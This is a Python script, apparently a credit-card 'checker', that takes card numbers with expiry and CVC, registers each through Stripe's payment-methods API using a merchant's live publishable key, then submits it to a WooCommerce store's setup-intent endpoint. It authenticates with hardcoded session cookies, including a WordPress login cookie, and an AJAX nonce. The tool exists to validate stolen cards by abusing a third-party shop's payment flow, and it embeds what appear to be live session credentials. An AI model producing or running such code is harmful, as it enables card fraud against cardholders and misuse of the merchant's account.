import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=MM&payment_user_agent=stripe.js%2Fb518849afd%3B+stripe-js-v3%2Fb518849afd%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fsissylover.com&time_on_page=265279&client_attribution_metadata[client_session_id]=8f4656eb-3a15-46a7-8e22-6aaa836435da&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=b2e09c4a-40b5-4b00-830d-705821b5386d&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP&_stripe_version=2024-06-20'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__stripe_mid': '218e8f72-9b96-4912-b5fe-64c9010f1d067a5baa',
	    'yay_currency_widget': '618495',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2026-02-11%2009%3A11%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2026-02-11%2009%3A11%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
	    'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%22%2C%22session_start_time%22%3A%222026-02-11%2009%3A11%3A39%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': '2e78b07b-958f-4435-9898-0fad4a2e80ec9325b4',
	    'wordpress_logged_in_96b6c2e14a298a8aacd485caf4831926': 'username_ba85f577ee%7C1780325155%7CoyPvV02EtRVe0x103gnlocDJCbXZUq5YAYjvVuBn0wh%7C3b0c476fc23e9399fe61af1d526fbd02452d86ef98b17c8bac0562422701dfa4',
	    'sbjs_current': '%C2%9E%C3%A9e',
	    '_clck': '1nexmlu%5E2%5Eg41%5E0%5E2234',
	    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'sissylover.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=218e8f72-9b96-4912-b5fe-64c9010f1d067a5baa; yay_currency_widget=618495; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-02-11%2009%3A11%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-02-11%2009%3A11%3A39%7C%7C%7Cep%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29; mtk_src_trk=%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fsissylover.com%2Fmy-account%2Fpayment-methods%2F%22%2C%22session_start_time%22%3A%222026-02-11%2009%3A11%3A39%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=2e78b07b-958f-4435-9898-0fad4a2e80ec9325b4; wordpress_logged_in_96b6c2e14a298a8aacd485caf4831926=username_ba85f577ee%7C1780325155%7CoyPvV02EtRVe0x103gnlocDJCbXZUq5YAYjvVuBn0wh%7C3b0c476fc23e9399fe61af1d526fbd02452d86ef98b17c8bac0562422701dfa4; sbjs_current=%C2%9E%C3%A9e; _clck=1nexmlu%5E2%5Eg41%5E0%5E2234; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsissylover.com%2Fmy-account%2Fadd-payment-method%2F',
	    'origin': 'https://sissylover.com',
	    'referer': 'https://sissylover.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	}
	
	data = {
	    'action': 'create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': f'{pm}',
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': 'ebbdf8f033',
	}
	
	r2 = requests.post('https://sissylover.com/', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
